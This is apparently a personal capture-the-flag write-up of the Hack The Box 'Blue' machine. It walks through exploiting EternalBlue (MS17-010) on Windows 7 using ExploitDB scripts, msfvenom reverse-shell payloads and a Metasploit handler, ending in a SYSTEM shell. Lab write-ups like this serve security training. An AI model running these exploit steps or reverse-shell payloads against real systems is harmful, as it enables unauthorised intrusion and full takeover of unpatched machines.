# Eternal Blue

I decided to google the operating system, searching "windows 7 7601 exploit". This immediately revealed that the system was vulnerable to Eternal Blue.

Exploit DB reveals that it can be used for local privilege escalation: [https://www.exploit-db.com/exploits/47176](https://www.exploit-db.com/exploits/47176). So I perhaps needed to find another way to gain a foothold on the box first.

I took another look at Google, and there was a separate writeup from Rapid7 that suggested remote code execution over SMB:

[https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

This looked much more useful. It was available on `msfconsole`, but I decided to use the version from ExploitDB instead as metasploit is prohibited in OSCP.

## Editing the 42031 Exploit

I spent a while on this box editing the `windows/remote/42031.py` exploit on ExploitDB to work with `python2` on my machine. The exploit didn't end up working in the end, but the steps involved highlighted an important skill. If you want to skip to the [[#Working Exploit - 42315|working exploit]] you can.

Running `42301.py` with `python3` causes an issue with the `pack()` function:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python3 42031.py 10.10.10.40
Traceback (most recent call last):
  File "/home/mac/Documents/HTB/blue/42031.py", line 83, in <module>
    ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde
TypeError: can't concat str to bytes
```

This is because `pack()` behaves differently in `python2`, for which the script was written.

There are a couple of ways to fix this:
- convert the script to `python3`
- run the script with `python2`

I thought running it with `python2` was simplest:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 42031.py 
Traceback (most recent call last):
  File "42031.py", line 2, in <module>
    from impacket import smb
ImportError: No module named impacket
```

However, the `python2` version of the `impacket` module was not installed. To get this, I had to install the `python2` version of `pip`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 get-pip.py
...[snip]...
Successfully installed pip-20.3.4 wheel-0.36.2
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ /home/mac/.local/bin/pip2.7 install impacket
...[snip]...
```

This fixed our issues, and we could now run our script:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.14.2 LPORT=9001 > shellcode
...[snip]...
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 42031.py 10.10.10.40 shellcode
```

As I said, the script didn't end up working - but these debugging steps were useful to learn. [This thread](https://forum.hackthebox.eu/discussion/4061/need-help-with-manual-py-exploit-cant-concat-str-to-bytes) on the HTB forum was extremely useful.

## Working Exploit - 42315

I followed [this excellent tutorial](https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/) on exploiting Eternal Blue manually. It used a different exploit, `windows/remote/42315.py`.

First, mirror the exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ searchsploit -m windows/remote/42315.py
```

The exploit requires providing a working username. When I first tried the box I went with `null`, as I had used it to login before.

I tried the exploit multiple times before realising this was incorrect - in fact, earlier enumeration exposed that `guest` was the correct username to login with. I set this in the code:

![[Pasted image 20210501185951.png]]

After setting the username, I downloaded `mysmb`, a required package:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

Then I ran a scan for named pipes on the box. These allow processes to communicate and specifying one is a crucial step of the exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfconsole -q
msf6 > use auxiliary/scanner/smb/pipe_auditor 
msf6 auxiliary(scanner/smb/pipe_auditor) > set rhosts 10.10.10.40
rhosts => 10.10.10.40
msf6 auxiliary(scanner/smb/pipe_auditor) > run

[+] 10.10.10.40:445       - Pipes: \netlogon, \lsarpc, \samr, \browser, \atsvc, \epmapper, \eventlog, \InitShutdown, \keysvc, \lsass, \LSM_API_service, \ntsvcs, \plugplay, \protected_storage, \scerpc, \srvsvc, \trkwks, \W32TIME_ALT, \wkssvc
[*] 10.10.10.40:          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

We can use `netlogon` as our pipe. Now let's rerun it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 42315.py 10.10.10.40 netlogon
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8004885020
SESSION: 0xfffff8a0015fa7e0
FLINK: 0xfffff8a0037dd088
InParam: 0xfffff8a0037d715c
MID: 0x3e03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Done
```

So it worked! We don't have visibility over whether the file was created, as it is on the system itself not the SMB share. So now we have to modify the exploit to let us privesc.

We want to change the exploit to instead request a file from our box and execute it, using `service_exec()`.

First, we need to create a shell `.exe` file to upload to the box:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp lhost=10.10.14.2 lport=9001 -e x64/xor -i 5 -f exe -o shell.exe
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor succeeded with size 591 (iteration=1)
x64/xor succeeded with size 631 (iteration=2)
x64/xor succeeded with size 671 (iteration=3)
x64/xor succeeded with size 711 (iteration=4)
x64/xor chosen with final size 711
Payload size: 711 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

The first exploit I tried involved using `bitsadmin` to download the shell script from our box, as shown below:

![[Pasted image 20210501180503.png]]

However this would turn out not to work, and I eventually settled on using `smb_send_file` instead:

![[Pasted image 20210501191017.png]]

(*note:* I also changed the name of the `.exe` to `sc.exe`, in case `shell.exe` was getting caught by AV - this turned out not to be the issue, but that's why the filename has changed)

I used the `msf` handler, as per the tutorial:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ msfconsole -q
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 9001
lport => 9001
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.2:9001 
```

I spent a while debugging my payloads - I had made some syntax errors in my original attempt, which I've excluded because no one wants to read those.

My real issues turned out to be getting the username and delivery method incorrect, but most of my time was spent changing payloads as I believed that to be the issue at the time. A lesson was learnt here - go for the simplest payload first and make sure everything else is correct before you go changing it.

When all that was fixed I ran my exploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/blue]
└─$ python2 exploit.py 10.10.10.40 netlogon
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8002dc6ba0
SESSION: 0xfffff8a001520560
FLINK: 0xfffff8a008214048
InParam: 0xfffff8a00826015c
MID: 0x2207
unexpected alignment, diff: 0x-4cfb8
leak failed... try again
CONNECTION: 0xfffffa8002dc6ba0
SESSION: 0xfffff8a001520560
FLINK: 0xfffff8a004117048
InParam: 0xfffff8a00827215c
MID: 0x2207
unexpected alignment, diff: 0x-415bfb8
leak failed... try again
CONNECTION: 0xfffffa8002dc6ba0
SESSION: 0xfffff8a001520560
FLINK: 0xfffff8a008254048
InParam: 0xfffff8a00890715c
MID: 0x2207
unexpected alignment, diff: 0x-6b3fb8
leak failed... try again
CONNECTION: 0xfffffa8002dc6ba0
SESSION: 0xfffff8a001520560
FLINK: 0xfffff8a00891f088
InParam: 0xfffff8a00891915c
MID: 0x2303
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Opening SVCManager on 10.10.10.40.....
Creating service WiMl.....
Starting service WiMl.....
The NETBIOS connection with the remote host timed out.
Removing service WiMl.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

I got a shell!

![[Pasted image 20210501191120.png]]

It seems this pops out directly as system. So we can go and grab both flags.

There's the `pwned.txt` file from before...

```cmd
c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of c:\

14/07/2009  04:20    <DIR>          PerfLogs
24/12/2017  03:23    <DIR>          Program Files
14/07/2017  17:58    <DIR>          Program Files (x86)
01/05/2021  17:55                 0 pwned.txt
01/05/2021  19:14             7,168 sc.exe
14/07/2017  14:48    <DIR>          Share
21/07/2017  07:56    <DIR>          Users
15/01/2021  11:42    <DIR>          Windows
```

And here are the flags:

![[Pasted image 20210501191356.png]]

![[Pasted image 20210501192018.png]]

That's the box!

![[Pasted image 20210501205703.png]]

# Tags

#writeup #cve #windows #oscp-prep 